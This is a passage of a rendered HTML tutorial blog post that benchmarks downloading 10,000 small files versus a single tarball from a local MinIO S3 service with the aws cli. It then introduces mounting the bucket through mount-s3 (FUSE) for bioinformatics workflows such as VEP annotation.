60%)">AWS_DEFAULT_REGION</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"us-east-1"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_ENDPOINT_URL</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"http://localhost:9000"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">sleep</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> aws s3 mb s3://io-benchmark --endpoint-url http://localhost:9000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">results/tarball.tar:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	@mkdir </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> results/tarball</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	@count</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">size</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">1M</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">index</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">k</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> $</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">seq</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> $$count</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token function" style="color:hsl(221, 87%, 60%)">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">if</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">/dev/zero </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">of</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">results/tarball/$</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${size}</span><span class="token plain">-$</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${index}</span><span class="token plain">-</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$$</span><span class="token plain">k.data </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">bs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">count</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">seek</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$$</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-cvf</span><span class="token plain"> results/tarball.tar </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> results/tarball </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">upload-tar:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> results/tarball.tar s3://io-benchmark/ --endpoint-url http://localhost:9000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">upload-10k-files:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> results/tarball  s3://io-benchmark/tarball --endpoint-url http://localhost:9000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--recursive</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="start-s3-service">Start S3 service<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#start-s3-service" class="hash-link" aria-label="Direct link to Start S3 service" title="Direct link to Start S3 service" translate="no">​</a></h3>
<p>Now you are ready to work with S3 object storage, this one will launch the minio, the simulated compatible S3 service with AWS. That will help to minimize the error related to your local computer and the remote bucket. This will create bucket called io-benchmark. Also simulated a lot of small files that we use later for proof of concept of this issue</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> aws-config</span><br></span></code></pre></div></div>
<p>To test the s3 service</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># export env</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_ACCESS_KEY_ID</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"minioadmin"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_SECRET_ACCESS_KEY</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"minioadmin"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_DEFAULT_REGION</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"us-east-1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_ENDPOINT_URL</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"http://localhost:9000"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># configure threads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws configure </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> default.s3.max_concurrent_requests </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># test bucket</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain">  --endpoint-url http://localhost:9000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1026-01-27 10:29:58 io-benchmark</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing-download-independently">Testing Download Independently<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#testing-download-independently" class="hash-link" aria-label="Direct link to Testing Download Independently" title="Direct link to Testing Download Independently" translate="no">​</a></h3>
<p>The above file content is the <code>Makefile</code> which simulates to create 1GB in total for a folder with 10k files, each file is 1MB. Nextflow is usually has the slow performance for input by 2 main reason:</p>
<ul>
<li class="">Verify download for each file</li>
<li class="">Calculate inputs cache for all small files</li>
</ul>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><p>It will create the additional tar file of these 10k files, that I will show you later why we create it and how it make your workflow easier</p></div></div>
<p>Without nextflow intervection, we want to test how long does it takes using aws cli v2 only</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="download-10k-files">Download 10k files<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#download-10k-files" class="hash-link" aria-label="Direct link to Download 10k files" title="Direct link to Download 10k files" translate="no">​</a></h4>
<p>Run this command to download</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> upload-10k-files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> /usr/bin/time </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%e"</span><span class="token plain"> aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> s3://io-benchmark/tarball ./tarball --endpoint-url http://localhost:9000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--recursive</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> ./tarball</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>The stderr shows that it takes around 110 seconds to download files</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token number" style="color:hsl(35, 99%, 36%)">110.62</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">109.62</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">110.59</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="download-tarfile">Download tarfile<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#download-tarfile" class="hash-link" aria-label="Direct link to Download tarfile" title="Direct link to Download tarfile" translate="no">​</a></h4>
<p>Run this command to download, it will be much faster</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> upload-tar</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> /usr/bin/time </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%e"</span><span class="token plain"> aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> s3://io-benchmark/tarball.tar </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"> --endpoint-url http://localhost:9000 </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> ./tarball.tar</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>The stderr shows that it takes less than 30 seconds to download this large file.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token number" style="color:hsl(35, 99%, 36%)">27.50</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">26.96</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">25.35</span><br></span></code></pre></div></div>
<p>However, we need to have the small file inside, we can use pipe "|" to do it when we download file quickly</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> /usr/bin/time </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%e"</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'mkdir -p tarball &amp;&amp; aws s3 cp s3://io-benchmark/tarball.tar - --endpoint-url http://localhost:9000 | tar -xvf - -C tarball'</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> ./tarball</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>The stderr shows that it takes less than 35 seconds to download and untar to get all small files</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token number" style="color:hsl(35, 99%, 36%)">33.43</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">31.80</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">33.20</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="fuse-based-system">Fuse based system<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#fuse-based-system" class="hash-link" aria-label="Direct link to Fuse based system" title="Direct link to Fuse based system" translate="no">​</a></h4>
<p>Beside using the aws command to download individual files or tar file, using fuse based system is the alternative approach.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">For small files: FUSE enables applications to access individual files on demand without needing to download an entire archive or use complex commands, reducing overhead and making access fast and convenient.</li>
<li class="">For large files: FUSE filesystems can fetch only the needed data chunks, allowing for efficient partial reads, sequential streaming, and avoiding unnecessary full downloads.</li>
<li class="">General advantage: Since FUSE exposes cloud storage as a standard directory tree, workflows and tools that use local files work seamlessly, enabling parallel access and integration with caching and prefetching optimizations.</li>
</ul></div></div>
<p>It can be used for using in the application that works with the large file or the folder contains many small files but it does not load entirely. For example, we annotate the variant for whole exome data but the annotation database
is used for entire genome. We can use the tool to get only a few annotated variants region. Beside, distributed engine with fuse based system can be useful for distributed loading.</p>
<p><code>Makefile</code> to quickly install mount-s3 via pixi. It will mount the whole bucket to the <code>/mnt/vep_cache</code>. This mount point is named after <code>vep</code> later it will be used direclty with VEP annotation example</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">mount-s3-vep-cache: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ./mnt/vep_cache</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ./mnt/tmp</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">mount</span><span class="token plain"> mount-s3 --endpoint-url http://localhost:9000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--region</span><span class="token plain"> us-east-1 --force-path-style io-benchmark ./mnt/vep_cache --read-only </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--cache</span><span class="token plain"> ./mnt/tmp --max-threads </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><br></span></code></pre></div></div>
<p>Run this command to allow mount the remote s3 bucket</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> mount-s3-vep-cache</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># check</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">df</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Filesystem           